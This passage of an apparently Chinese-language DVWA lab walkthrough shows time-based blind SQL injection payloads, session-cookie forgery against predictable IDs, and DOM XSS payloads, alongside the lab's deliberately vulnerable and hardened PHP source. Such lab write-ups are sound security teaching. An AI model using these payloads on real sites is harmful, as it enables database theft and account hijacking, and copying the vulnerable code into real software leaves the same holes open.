<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1&#x27; and if(length(database())=1,sleep(5),1) <span class="comment">#    没有延迟</span></span><br><span class="line">1&#x27; and if(length(database())=2,sleep(5),1) <span class="comment">#    没有延迟</span></span><br><span class="line">1&#x27; and if(length(database())=3,sleep(5),1) <span class="comment">#    没有延迟</span></span><br><span class="line">1&#x27; and if(length(database())=4,sleep(5),1) <span class="comment">#    有延迟,说明数据库长度为4字符</span></span><br></pre></td></tr></table></figure>
<p>二分法猜解数据库名</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">1&#x27; and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1) #    明显延迟</span><br><span class="line">...</span><br><span class="line">1&#x27; and if(ascii(substr(database(),1,1))&lt;100,sleep(5),1) #    没有延迟</span><br><span class="line">1&#x27; and if(ascii(substr(database(),1,1))&gt;100,sleep(5),1) #    没有延迟</span><br></pre></td></tr></table></figure>
<p>说明数据库名的第一个字符为 <code>d</code> ，同样步骤依次猜解其他字母。</p>
<ul>
<li>猜解数据库中的表名</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1&#x27; and if((<span class="keyword">select</span> <span class="keyword">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() )=<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>) <span class="comment">#    没有延迟</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(5),1) #    有延迟</span></span><br></pre></td></tr></table></figure>
<p>说明有两个表，接着猜解表名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1&#x27; and if(length(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>) <span class="comment">#    没有延迟</span></span><br><span class="line">...</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) #    有延迟</span></span><br></pre></td></tr></table></figure>
<p>说明第一个表名长度为9个字符，采用二分法猜解表名</p>
<ul>
<li>猜解表中的字段名</li>
</ul>
<p>猜解表中字段的数量</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1&#x27; and if((<span class="keyword">select</span> <span class="keyword">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name= <span class="string">&#x27;users&#x27;</span>)=<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>) <span class="comment">#    没有延迟</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and if((select count(column_name) from information_schema.columns where table_name= &#x27;</span><span class="keyword">users</span><span class="string">&#x27;)=8,sleep(5),1) #    有延迟</span></span><br></pre></td></tr></table></figure>
<p>说明users表中有8个字段，接着猜解字段名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1&#x27; and if(length(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name= <span class="string">&#x27;users&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>) <span class="comment">#    没有延迟</span></span><br><span class="line">...</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and if(length(substr((select column_name from information_schema.columns where table_name= &#x27;</span><span class="keyword">users</span><span class="string">&#x27; limit 0,1),1))=7,sleep(5),1) #    明显延迟</span></span><br></pre></td></tr></table></figure>
<p>说明 users 表的第一个字段长度为7字符，采用二分法即可猜解出各字段名</p>
<ul>
<li>猜解数据</li>
</ul>
<p>同样使用二分法</p>
<h2 id="Medium-7"><a href="#Medium-7" class="headerlink" title="Medium"></a>Medium</h2><h3 id="源码-28"><a href="#源码-28" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line">    <span class="variable">$id</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$id</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$getid</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="subst">$id</span>;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$getid</span> ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="variable">$num</span> = @mysqli_num_rows( <span class="variable">$result</span> ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$num</span> &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>加入 <code>mysqli_real_escape_string</code> 函数对特殊字符 <code>\x00,\n,\r,&#39;,&quot;,\x1a</code> 进行转义，同时前端使用下拉表单控制用户的输入。</p>
</blockquote>
<h3 id="漏洞利用-21"><a href="#漏洞利用-21" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>前端虽然控制了输入，但可利用抓包的方式来进行修改，一样能达到效果，流程同 Low 级别。</p>
<h2 id="High-7"><a href="#High-7" class="headerlink" title="High"></a>High</h2><h3 id="源码-29"><a href="#源码-29" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_COOKIE</span>[ <span class="string">&#x27;id&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_COOKIE</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$getid</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$getid</span> ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="variable">$num</span> = @mysqli_num_rows( <span class="variable">$result</span> ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$num</span> &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Might sleep a random amount</span></span><br><span class="line">        <span class="keyword">if</span>( rand( <span class="number">0</span>, <span class="number">5</span> ) == <span class="number">3</span> ) &#123;</span><br><span class="line">            sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">        header( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>利用cookie传递参数id，查询结果为空时，会执行函数 <code>sleep(seconds)</code> 目的是为了扰乱时间盲注，同时在 SQL 查询语句中加入 <code>limit 1</code> 控制只输出；一个结果。</p>
</blockquote>
<h3 id="漏洞利用-22"><a href="#漏洞利用-22" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>虽然加入 <code>limit 1</code> 但仍可通过 <code>#</code> 将其注释掉，由于服务器端执行 <code>sleep</code> 函数会使时间注入的准确性受影响，可利用布尔注入达到目的。利用抓包改包的方式进行</p>
<h2 id="Impossible-7"><a href="#Impossible-7" class="headerlink" title="Impossible"></a>Impossible</h2><h3 id="源码-30"><a href="#源码-30" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( <span class="variable">$id</span> )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:id&#x27;</span>, <span class="variable">$id</span>, PDO::PARAM_INT );</span><br><span class="line">        <span class="variable">$data</span>-&gt;execute();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Get results</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$data</span>-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">            header( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>采用 PDO 技术，划清了代码与数据的界限，有效防御 SQL 注入，加入<code>Anti-CSRF token</code> 机制提供了安全性</p>
</blockquote>
<h1 id="Weak-Session-IDs-弱会话ID"><a href="#Weak-Session-IDs-弱会话ID" class="headerlink" title="Weak Session IDs (弱会话ID)"></a>Weak Session IDs (弱会话ID)</h1><blockquote>
<p>SessionID 会话ID,通常用于标识已登录的用户，证明用户在会话中的身份。<br>Cookie 用于标识客户端的用户身份,通常是勾选 <code>下次自动登录</code> 后保存在用户端的身份证明凭证,在 Cookie 过期前,用户不必输入用户名和密码就能登录。</p>
</blockquote>
<p>说白了就是 <code>Cookie</code> 盗用,一般都是和 XSS 一起使用。</p>
<h2 id="Low-8"><a href="#Low-8" class="headerlink" title="Low"></a>Low</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$html</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id&#x27;</span>]++;</span><br><span class="line">    <span class="variable">$cookie_value</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id&#x27;</span>];</span><br><span class="line">    setcookie(<span class="string">&quot;dvwaSession&quot;</span>, <span class="variable">$cookie_value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>每次生成的 <code>session_id</code> 加1发给客户端</p>
</blockquote>
<h3 id="漏洞利用-23"><a href="#漏洞利用-23" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><code>Generate</code> &gt;&gt; Burp Suite Pro 抓包 &gt;&gt; <code>Cookie: PHPSESSID=tjbmcu13aaho7ab653vqpeibn3; security=low</code> &gt;&gt; <code>Action</code> &gt;&gt; <code>Send to Response</code> &gt;&gt; <code>Response</code> &gt;&gt; <code>Go</code> &gt;&gt; <code>Request</code> 请求一次 <code>Response</code> 中 <code>Set-Cookie: dvwaSession</code> 的值就 <code>加1</code></p>
<p>Burp Suite Pro 将刚才拦截的数据包放行 &gt;&gt; <code>Generate</code> &gt;&gt; 再次抓包 &gt;&gt; <code>Cookie: dvwaSession=4; PHPSESSID=tjbmcu13aaho7ab653vqpeibn3; security=low</code> 前面请求了几次这里的 <code>dvwaSession</code> 就变成了多少。 &gt;&gt; 且每次请求只改变 <code>dvwaSession</code> 其他值不发生改变 &gt;&gt; 复制 <code>Cookie</code> 值 <code>Cookie: dvwaSession=4; PHPSESSID=tjbmcu13aaho7ab653vqpeibn3; security=low</code> &gt;&gt; 换<strong>火狐浏览器</strong>(本身就是火狐则 <code>Cookie</code> 等数据，谷歌浏览器可能不成功) &gt;&gt; 输入网址 <code>http://dvwa.local/vulnerabilities/weak_id/</code> 使用插件 <code>hackbar</code> 修改 <code>Cookie</code> 值然后访问，<strong>没输入用户名密码就直接进来了</strong>，甚至不用 <code>dvwaSession</code> 也能访问。</p>
<h2 id="Medium-8"><a href="#Medium-8" class="headerlink" title="Medium"></a>Medium</h2><h3 id="源码-31"><a href="#源码-31" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$html</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$cookie_value</span> = time();</span><br><span class="line">    setcookie(<span class="string">&quot;dvwaSession&quot;</span>, <span class="variable">$cookie_value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>使用当前时间的时间戳作为<code>SessionID</code></p>
</blockquote>
<h3 id="漏洞利用-24"><a href="#漏洞利用-24" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>和自增1没区别，说白了就是从 Unix 纪元 (January 1 1970 00:00:00 GMT) 到现在的秒数，就是一秒一秒的自增，可利用时间戳查询工具伪造。<a href="https://tool.chinaz.com/tools/unixtime.aspx">Unix时间戳工具</a></p>
<h2 id="High-8"><a href="#High-8" class="headerlink" title="High"></a>High</h2><h3 id="源码-32"><a href="#源码-32" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$html</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id_high&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id_high&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id_high&#x27;</span>]++;</span><br><span class="line">    <span class="variable">$cookie_value</span> = md5(<span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id_high&#x27;</span>]);</span><br><span class="line">    setcookie(<span class="string">&quot;dvwaSession&quot;</span>, <span class="variable">$cookie_value</span>, time()+<span class="number">3600</span>, <span class="string">&quot;/vulnerabilities/weak_id/&quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>], <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>使用 <code>setcookie(name,value,expire,path,domain,secure,httponly)</code> 函数定义 Cookie ，<code>name</code> 必要，cookie 名称，<code>value</code> 必要，cookie 值，<code>expire</code> cookie 有效期，<code>path</code> cookie 服务器路径，<code>domain</code> cookie 域名，<code>secure</code> 是否通过 HTTPS 连接传输 cookie ，<code>httponly</code> cookie 是否仅通过 HTTP 协议访问<br>使用 MD5 值将生成的 <code>session_id</code> 进行加密，使无法直接推测出 <code>SessionID</code></p>
</blockquote>
<h3 id="漏洞利用-25"><a href="#漏洞利用-25" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用 Burp Suite Pro 的 <code>Response</code> 进行重复请求，通过返回的 <code>Set-Cookie</code> 都是无规则的字符串，推测是 MD5 加密的值，使用 MD5 解密得到了数字,说白了就是将 Low 级别基础上添加了一个 MD5 加密，使用 MD5 工具就能伪造。</p>
<p><a href="https://www.cmd5.com">MD5加解密</a></p>
<h2 id="Impossible-8"><a href="#Impossible-8" class="headerlink" title="Impossible"></a>Impossible</h2><h3 id="源码-33"><a href="#源码-33" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$html</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$cookie_value</span> = sha1(mt_rand() . time() . <span class="string">&quot;Impossible&quot;</span>);</span><br><span class="line">    setcookie(<span class="string">&quot;dvwaSession&quot;</span>, <span class="variable">$cookie_value</span>, time()+<span class="number">3600</span>, <span class="string">&quot;/vulnerabilities/weak_id/&quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>], <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>随机数 + 随机数 + 固定字符串 <code>Impossible</code> 再进行 sha1 运算</p>
</blockquote>
<h1 id="XSS-DOM-（DOM-Based-Cross-Site-Scripting-DOM型跨站脚本攻击）"><a href="#XSS-DOM-（DOM-Based-Cross-Site-Scripting-DOM型跨站脚本攻击）" class="headerlink" title="XSS(DOM) （DOM Based Cross Site Scripting ,DOM型跨站脚本攻击）"></a>XSS(DOM) （DOM Based Cross Site Scripting ,DOM型跨站脚本攻击）</h1><p>DOM 是与平台、编程语言无关的接口，它允许程序或脚本动态访问和更新文档内容、结构和样式，处理结果能成为页面显示的一部分。DOM 中有很多对象，其中一些是用户可以操作的(如 <code>URI , location , refelTer</code> d等)。客户端脚本程序可通过 DOM 动态检查修改页面内容，不依赖于提交数据到服务端，而从客户端获得 DOM 中的数据在本地执行，如果 DOM 中的数据没有经过严格检查，就会产生 DOM-based XSS漏洞。</p>
<p>可能触发 DOM 型 XSS 的属性：</p>
<ul>
<li><code>document.referer</code></li>
<li><code>window.name</code></li>
<li><code>location</code></li>
<li><code>innerHTML</code></li>
<li><code>document.write</code></li>
</ul>
<p><code>document</code> 表一个文档对象， <code>window</code> 表一个窗口对象，一个窗口下可有多个文档对象。所有一个窗口下只有一个 <code>window.location.href</code>，却可能有多个 <code>document.URL</code>、<code>document.location.href</code></p>
<p><code>document.URL</code> 取值等价于 <code>window.location.href</code> 或 <code>document.location.href</code> ，某些浏览器中可通过对 <code>document.URL</code> 赋值实现页面跳转，但某些浏览器不行。</p>
<p><strong>该实验尽量选择使用火狐浏览器进行，火狐没有 XSS  过滤</strong></p>
<blockquote>
<p><code>indexOf(searchvalue,fromindex)</code> 方法可返回指定字符串值在字符串首次出现的位置。<code>searchvalue</code> 必需，需检索的字符串值；<code>fromindex</code> 可选整数参数，规定字符串开始检索的位置，取值为 <code>0~stringObject.length-1</code> 若省略该参数，将从首字符开始检索。<code>indexOf()</code> 对大小写敏感，若未检索到字符串值，返回为 <code>-1</code> 。<br><code>substring(start,stop)</code> 方法用于提取字符串中介于两个指定下标间的字符。<code>start</code> 必需，一个非负整数，规定提取字符的第一个字符在 <code>stringObject</code> 中的位置；<code>stop</code> 可选，一个非负整数，需要提取字符串最后一个字符的后一位，若省略该参数，将提取到结尾。<br><code>document.write</code> 是 <code>JavaScript</code> 中对 <code>document.open</code> 所开启的文档流 <code>document.stream</code> 操作的 API 方法，它能直接在文档流中写入字符串，一旦文档流已经关闭，那 <code>document.write</code> 就会重新利用 <code>document.open</code> 打开新的文档流并写入，此时原来的文档流就会被清空，已渲染好的页面就会被清除，浏览器将重新构建 DOM 并渲染新页面。</p>
</blockquote>
<h2 id="Low-9"><a href="#Low-9" class="headerlink" title="Low"></a>Low</h2><h3 id="Low-10"><a href="#Low-10" class="headerlink" title="Low"></a>Low</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># No protections, anything goes</span></span><br><span class="line"><span class="comment"># 没有任何防护措施</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="漏洞利用-26"><a href="#漏洞利用-26" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><code>English</code> ,<code>Select</code> &gt;&gt; URL 发现 <code>default</code> 参数值为 <code>English</code> &gt;&gt; 构造URL <code>http://dvwa.local/vulnerabilities/xss_d/?default=&lt;script&gt;alert(&#39;DOM XSS&#39;)&lt;/script&gt;</code> &gt;&gt; 访问后 js 代码 <code>alert</code> 被执行，弹框显示了构造的内容。 &gt;&gt; F12 可查看到脚本内容</p>
<h2 id="Medium-9"><a href="#Medium-9" class="headerlink" title="Medium"></a>Medium</h2><h3 id="漏洞利用-27"><a href="#漏洞利用-27" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !is_null (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line">    <span class="variable">$default</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Do not allow script tags</span></span><br><span class="line">    <span class="keyword">if</span> (stripos (<span class="variable">$default</span>, <span class="string">&quot;&lt;script&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        header (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>array_key_exists(key,array)</code> 检查某数组中是否存在指定的键，若键存在返回 <code>true</code> 不存在返回 <code>false</code> 。 <code>key</code> 必需，指定键名；<code>array</code> 必需，指定数组。<br><code>stripos(string,find,start)</code> 查找字符串在另一字符串中第一次出现的位置，返回字符串第一次出现的位置，若未找到字符串则返回 <code>false</code> 。<code>string</code> 必需，指定被搜索的字符串； <code>find</code> 必需，指定要查找的字符串；<code>start</code> 可选，指定开始搜索的位置。<br><code>header(string,replace,http_response_code)</code> 向客户端发送原始 HTTP 报头。<code>string</code> 必需，指定要发送的报头字符串；<code>replace</code> 可选，指定该报头是否替换之前的报头，或添加第二个报头,默认替换(true) ，也可允许相同类型的多个报头(false)；<code>http_response_code</code> 可选，把 HTTP 响应代码强制为指定值(PHP 4 及更高版本)。</p>
</blockquote>
<p>对 <code>default</code> 变量进行过滤，通过 <code>stripos()</code> 查找<code>&lt;script</code> 字符串在<code>default</code> 变量值中第一次出现的位置(不区分大小写)，如果匹配就通过 <code>location</code> 将 URL 参数修正为 <code>?default=English</code></p>
<h3 id="漏洞利用-28"><a href="#漏洞利用-28" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>过滤了 <code>script</code> 可使用其他标签达到效果。</p>
<ul>
<li>使用<code>&lt;/option&gt;</code>和<code>&lt;/select&gt;</code>闭合后使用 <code>img</code> 标签弹框。</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?default=English&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>直接利用 <code>input</code> 弹框</li>
</ul>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">default</span>=English&lt;input onclick=alert(<span class="string">&#x27;XSS&#x27;</span>) /&gt;</span><br></pre></td></tr></table></figure>
